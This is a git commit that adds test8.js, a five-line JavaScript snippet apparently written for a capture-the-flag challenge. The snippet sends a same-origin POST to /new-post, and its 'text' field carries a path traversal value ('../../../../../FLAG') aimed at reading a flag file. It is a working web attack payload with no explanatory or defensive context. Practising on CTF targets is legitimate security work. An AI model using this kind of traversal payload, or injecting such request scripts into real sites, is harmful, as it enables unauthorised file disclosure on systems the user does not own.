b18db8a9ff1be7e17a7e161ece0639a4d0098438
Guignolardinio <143706283+Guignolardinio@users.noreply.github.com>
2023-11-24 11:08:09 +0100

    Create test8.js

---
+++ test8.js
@@ -0,0 +1,5 @@
+var post_data = 'title=TestTitle&text=../../../../../FLAG&submit-template=a&theme=Funny';
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("POST", "/new-post", true);
+xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xmlhttp.send(post_data);
